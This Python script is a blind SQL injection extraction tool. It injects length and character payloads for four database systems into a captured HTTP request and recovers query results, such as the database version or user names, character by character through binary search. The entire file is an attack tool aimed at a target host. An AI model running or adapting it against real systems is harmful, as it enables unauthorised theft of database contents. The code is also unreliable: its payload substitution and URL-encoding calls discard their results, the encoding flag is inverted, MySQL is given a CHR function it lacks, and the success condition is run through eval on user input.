from requests import Request, Session
import time
import sys
import math
import urllib.parse
import urllib3
import argparse
from http.server import BaseHTTPRequestHandler
from io import BytesIO

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class HTTPRequest(BaseHTTPRequestHandler):
    def __init__(self, request_text):
        self.rfile = BytesIO(request_text)
        self.raw_requestline = self.rfile.readline()
        self.error_code = self.error_message = None
        self.parse_request()

    def send_error(self, code, message):
        self.error_code = code
        self.error_message = message


class SqlGrab:
    """

    """

    payloads = {
        'mysql': {
            'length': 'LENGTH(({query})){operator}{value}',
            'character': 'SUBSTRING(({query}),{index},1){operator}CHR({value})',
            'string': 'STRCMP(({query}),{value})'
        },
        'mssql': {
            'length': 'LEN(({query})){operator}{value}',
            'character': 'SUBSTRING(({query}),{index},1){operator}CHR({value})',
            'string': '({query})=\'{value}\''
        },
        'oracle': {
            'length': 'LENGTH(({query})){operator}{value}',
            'character': 'SUBSTR(({query}),{index},1){operator}CHR({value})',
            'string': '({query})=\'{value}\''
        },
        'postgresql': {
            'length': 'LENGTH(({query})){operator}{value}',
            'character': 'SUBSTRING(({query}),{index},1){operator}CHR({value})',
            'string': '({query})=\'{value}\''
        },
    }

    initialLength = 16
    initialCharacter = ord('Z')
    payloadLocations = []


    def __init__(self, options):
        # set options
        self.urlencode = options.urlencode
        self.delay = options.delay
        self.payloads = self.payloads[options.dbms]
        self.condition = options.condition
        self.session = Session()

        if options.proxy:
            self.proxy = {
                'http': options.proxy,
                'https': options.proxy
            }
        else:
            self.proxy = {}

        try:
            # parse the base request from file
            self.request = self.parseRequest(options.host, options.request)
            print(
                f'[*] Query: \'{options.query}\'. Inserting payload into {", ".join(self.payloadLocations)}. Determining length...')

            # get the length of the query output
            length = self.getLength(query=options.query)
            print(f'[*] The query output is {length} characters in length.')

            # retrieve the output
            result = self.getString(query=options.query, length=length)
            print(f'\n{result}')

        except RuntimeError:
            print('[!] The result was invalid, either due to a syntax error or because no result exists. Send the requests to Repeater and sanity check them.', file=sys.stderr)
        except Exception as e:
            print(e)
        except KeyboardInterrupt:
            print('\n[!] Interrupted')

    def isMatch(self, response):  # Change me to whatever condition counts as True
        return eval(self.condition, locals())
        # examples:
        # return response.status_code == 403
        # return response.elapsed > datetime.timedelta(milliseconds=100)
        # return len(response.content) > 11443

    def getValue(self, payload, args, range=(0, math.inf), context=None, ):
        """ Determines the value of a vairable based on iterative halving/doubling of the search space """
        min, max = range

        while min != max:

            if self.getMatch(payload, args=dict(**args, operator='>')):  # if greater than value
                min = args['value'] + 1
            else:  # if less than value
                max = args['value']

            if max == math.inf:
                # double value to find upper bound if not already found
                args['value'] *= 2
            else:
                # narrow down between that range
                args['value'] = min + int((max - min) / 2)

            if context:
                print(
                    f"[*] [\x1B[90m{context['i']}/{context['length']}: Between \'{chr(min)}\' and \'{chr(max)}\'\x1B[0m] \x1B[32m{context['result']}\x1B[0m", end='\r'
                )

            time.sleep(self.delay)

        # sanity check
        if not self.getMatch(payload, dict(**args, operator='=')):
            raise RuntimeError

        return args['value']

    def getLength(self, **args):
        return self.getValue(self.payloads['length'], args=dict(**args, value=self.initialLength))

    def getString(self, length, **args):
        ''' Determines the value of each character in a [length]-long string '''

        result = ''

        for i in range(1, length + 1):

            result += chr(self.getValue(
                payload=self.payloads['character'],
                range=(0x20, 0x7E),  # range of printable ASCII characters
                context={'i': i, 'length': length, 'result': result},
                args=dict(**args, index=i, value=self.initialCharacter)
            ))

        # sanity check
        if not self.getMatch(self.payloads['string'], args=dict(**args, value=result, operator='=')):
            raise RuntimeError

        return result

    def getMatch(self, payload, args):
        """Issues a request and determines truth value of query based on the response"""

        payload = payload.format(**args)

        prepared = self.request.prepare()

        if self.urlencode:
            urllib.parse.quote_plus(payload)

        # perform subsitution and optional encoding depending on location

        prepared.url.format(payload=payload)
        if prepared.body:
            prepared.body.format(payload=payload)
        prepared.headers = dict([(k, v.format(payload=payload))
                                for k, v in prepared.headers.items()])

        response = self.session.send(
            prepared,
            proxies=self.proxy,
            verify=False
        )

        return self.isMatch(response)

    def parseRequest(self, host, filename):
        with open(filename, 'rb') as fp:

            parser = HTTPRequest(fp.read())

            if parser.error_code:
                raise RuntimeError(
                    f'Error parsing request file: {parser.error_message}')

            host = '{uri.scheme}://{uri.netloc}'.format(
                uri=urllib.parse.urlparse(host))

            request = Request(
                method=parser.command,
                url=f'{host}{parser.path}',
                headers=parser.headers,
                data=parser.rfile.read(),
            )

            # scan the parsed request for payload tags before preparing it
            tag = '{payload}'
            if tag in request.url:
                self.payloadLocations.append('url')
            if request.data and tag in request.data:
                self.payloadLocations.append('body')
            for key, value in request.headers._headers:
                if tag in key:
                    self.payloadLocations.append('{key} header key')
                if tag in value:
                    self.payloadLocations.append(f'{key} header value')

            if not self.payloadLocations:
                raise Exception(
                    'The parsed request file does not contain a \'{payload}\' tag.')

            return request


if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        description='Extracts string data from a conditional SQLi vulnerability using a binary search tree approach.'
    )
    parser.add_argument('-u', '--host', required=True,
                        help='Host URL, including protocol scheme and optionally port. E.g. https://target.com:80')
    parser.add_argument('-r', '--request', required=True,
                        help='Request file containing one or more \'{payload}\' tags')
    parser.add_argument('-q', '--query', required=True,
                        help='SQL query to extract the response of. Must return a single string, e.g. @@version, SELECT user FROM dual')
    parser.add_argument('-d', '--dbms', required=True,
                        choices=['mysql', 'mssql', 'oracle', 'postgresql'])
    parser.add_argument('-c', '--condition', required=True, help='Python expression to evaluate to determine true/false from the response. E.g. \'"error" in response.text\', \'response.error_code == 401\', \'len(response.content) > 1433\'')
    parser.add_argument('--delay', required=False, default=0,
                        help='Delay in seconds to add between requests. Optional. E.g. 1, 0.2')
    parser.add_argument('--urlencode', required=False, action='store_false',
                        help='Perform URL-encoding on the payloads. Optional. E.g. True, False')
    parser.add_argument('--proxy', required=False,
                        help='Proxy to use, e.g. http://127.0.0.1:8080')

    args = parser.parse_args()

    SqlGrab(args)
